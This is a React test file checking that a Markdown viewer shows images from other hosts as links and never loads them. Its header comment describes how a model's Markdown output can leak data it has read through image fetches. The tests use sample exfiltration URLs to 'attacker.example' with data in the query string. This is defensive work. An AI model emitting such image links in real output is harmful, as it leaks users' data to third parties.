import { render, screen } from '@testing-library/react';
import { describe, expect, it } from 'vitest';

import { MarkdownView } from '../../client/components/markdown-view.js';

/**
 * An image in Markdown a model wrote can carry what the model just read to
 * another host, and the browser fetches it before anybody has looked. Only an
 * image on this site is loaded; any other is shown as a link.
 */
describe('Markdown images', () => {
  it('shows an image from another host as a link and never loads it', () => {
    const { container } = render(
      <MarkdownView content='![serials](https://attacker.example/x.png?d=SN123)' />,
    );
    expect(container.querySelector('img')).toBeNull();
    const link = screen.getByRole('link', { name: 'serials' });
    expect(link).toHaveAttribute(
      'href',
      'https://attacker.example/x.png?d=SN123',
    );
    expect(link).toHaveAttribute('target', '_blank');
  });

  it('labels a foreign image without alt text by its target', () => {
    render(<MarkdownView content='![](https://attacker.example/pixel.gif)' />);
    expect(
      screen.getByRole('link', { name: 'https://attacker.example/pixel.gif' }),
    ).toBeInTheDocument();
  });

  it('treats a protocol-relative URL as another host', () => {
    const { container } = render(
      <MarkdownView content='![x](//attacker.example/x.png)' />,
    );
    expect(container.querySelector('img')).toBeNull();
  });

  it('loads an image the application serves itself', () => {
    render(
      <MarkdownView
        content={`![photo](/main/api/files/1.png) ![same](${window.location.origin}/main/a.png)`}
      />,
    );
    expect(screen.getByRole('img', { name: 'photo' })).toHaveAttribute(
      'src',
      '/main/api/files/1.png',
    );
    expect(screen.getByRole('img', { name: 'same' })).toBeInTheDocument();
  });
});
